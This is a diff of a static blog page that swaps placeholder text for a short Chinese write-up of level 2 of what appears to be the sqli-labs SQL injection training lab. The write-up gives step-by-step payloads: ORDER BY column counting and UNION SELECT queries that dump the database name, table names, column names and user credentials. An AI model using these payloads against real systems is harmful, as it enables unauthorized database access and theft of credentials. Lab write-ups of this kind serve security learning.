@@ -16,15 +16,15 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="这是一篇测试文章">
+    <meta name="description" content="第二关1.判断注入类型：?id&#x3D;1 正常?id&#x3D;1’异常?id&#x3D;1’–+ 异常由此判断为整型注入2.判断字段数：?id&#x3D;1 order by 3 正常?id&#x3D;1 order by 4 异常判断字段数为33.爆数据库名?id&#x3D;-1 union select 1,database(),3可以查询到数据库名为security4.爆表名?id&amp;#">
 <meta property="og:type" content="article">
 <meta property="og:title" content="测试文章">
 <meta property="og:url" content="http://example.com/2021/06/10/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/index.html">
 <meta property="og:site_name" content="王海兴">
-<meta property="og:description" content="这是一篇测试文章">
+<meta property="og:description" content="第二关1.判断注入类型：?id&#x3D;1 正常?id&#x3D;1’异常?id&#x3D;1’–+ 异常由此判断为整型注入2.判断字段数：?id&#x3D;1 order by 3 正常?id&#x3D;1 order by 4 异常判断字段数为33.爆数据库名?id&#x3D;-1 union select 1,database(),3可以查询到数据库名为security4.爆表名?id&amp;#">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-06-10T08:35:20.000Z">
-<meta property="article:modified_time" content="2022-03-20T12:53:09.465Z">
+<meta property="article:modified_time" content="2022-03-24T06:19:30.122Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="原创">
 <meta name="twitter:card" content="summary_large_image">
@@ -197,7 +197,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      8 字
+      619 字
     </span>
   
 
@@ -206,7 +206,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1 分钟
+      6 分钟
     </span>
   
 
@@ -246,7 +246,7 @@
             <h1 style="display: none">测试文章</h1>
             
             <div class="markdown-body">
-              <p>这是一篇测试文章</p>
+              <p>第二关<br>1.判断注入类型：<br>?id&#x3D;1 正常<br>?id&#x3D;1’异常<br>?id&#x3D;1’–+ 异常<br>由此判断为整型注入<br>2.判断字段数：<br>?id&#x3D;1 order by 3 正常<br>?id&#x3D;1 order by 4 异常<br>判断字段数为3<br>3.爆数据库名<br>?id&#x3D;-1 union select 1,database(),3<br>可以查询到数据库名为security<br>4.爆表名<br>?id&#x3D;-1 union select 1,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;’security’),3<br>由此获得security的四个表，emails，referers,uagents,users<br>5.爆字段名<br>?id&#x3D;-1 union select 1,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;’security’and table_name&#x3D;’users’),3<br>获得表users的三个字段名，id，username，password<br>6.取数据<br>?id&#x3D;-1 union select 1,(select group_concat(id,username,password)from users),3</p>
 
             </div>
             <hr>
